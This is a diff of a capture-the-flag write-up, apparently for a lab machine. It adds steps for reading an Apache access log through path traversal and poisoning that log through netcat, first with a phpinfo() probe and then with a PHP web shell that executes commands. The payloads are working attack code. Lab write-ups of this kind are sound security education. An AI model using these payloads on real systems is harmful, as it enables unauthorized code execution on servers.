@@ -86,12 +86,37 @@ http://10.10.162.32//?view=php://filter/convert.base64-encode/resource=dog/../..
 work!
 ![image](https://user-images.githubusercontent.com/67756786/195553839-b10f7fb6-023f-4d19-9844-9ffe524981b8.png)
 
-Then we need to find where can excute RCE vulnerable.
+Then we need to find where can excute RCE vulnerable.  
 First, confirm what web server
 
 ![image](https://user-images.githubusercontent.com/67756786/195554515-62f65ee8-f2d2-4730-b4f6-4a17e62a6bbf.png)
 
+Second, confirm where apache log file
+![image](https://user-images.githubusercontent.com/67756786/195555607-9db42cbd-a824-4ea2-8e19-c1785156e75b.png)
+
+Finaly, try to got apache access.log
+```
+http://10.10.162.32//?view=dog/../../../../var/log/apache2/access&ext=.log
+```
+Work, nice!
+![image](https://user-images.githubusercontent.com/67756786/195556701-5a70e822-e099-4857-9d17-e43fd7adffd4.png)
+
+Now we try access.log can injection or not.
+```
+echo -e "GET <?php phpinfo(); ?>"| nc 10.10.162.32 80
+```
+Work
+![image](https://user-images.githubusercontent.com/67756786/195557135-6a978839-dad3-4fdd-a902-765dc8206e2f.png)
+
+Now I want put web shell into that.
+```
+echo -e "GET <?php if(isset($_GET['cmd']))  {  system($_GET['cmd']);  }?>" | nc 10.10.162.32 80
+```
+But I got this error message, and then I reboot target machine.
 ![image](https://user-images.githubusercontent.com/67756786/195541111-f95d8e1f-1e61-4993-8f85-7c2c0fa74aa2.png)
+
+
+
 - [x] FLAG2
 - [x] FLAG3
 - [x] FLAG4
